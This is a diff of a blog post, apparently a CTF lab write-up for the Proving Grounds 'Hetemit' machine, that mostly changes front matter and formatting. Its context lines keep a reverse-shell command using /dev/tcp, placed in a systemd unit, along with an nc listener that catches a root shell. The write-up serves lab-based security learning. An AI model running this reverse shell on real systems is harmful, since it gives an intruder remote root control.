@@ -2,19 +2,10 @@
 title: "Proving grounds Practice: Hetemit"
 layout: post
 date: 2024-03-27 02:00
-tag: 
-- CTF
-- Offsec labs
-- OSCP
-- Writeup
-- Linux
-- PG-Practice
-- File Write
-writeups: true
-hidden: true
-author: Naveen
-description: "Offsec proving grounds practice linux machine writeup"
+categories: writeup
 ---
+
+Proving grounds Practice - Hetemit CTF writeup.
 
 # NMAP
 
@@ -157,6 +148,7 @@ WantedBy=multi-user.target
 
 bash -c 'sh -i >& /dev/tcp/192.168.45.218/22 0>&1'
 ```
+<br>
 
 ```sh
 naveenj@hackerspace:[07:28]~/proving_grounds/Hetemit$ nc -lvnp 22
@@ -171,7 +163,7 @@ sh-4.4#
 
 ## References
 
-- https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740
-- https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49
+* https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740
+* https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49
 
-For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).
+For more updates and insights, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).
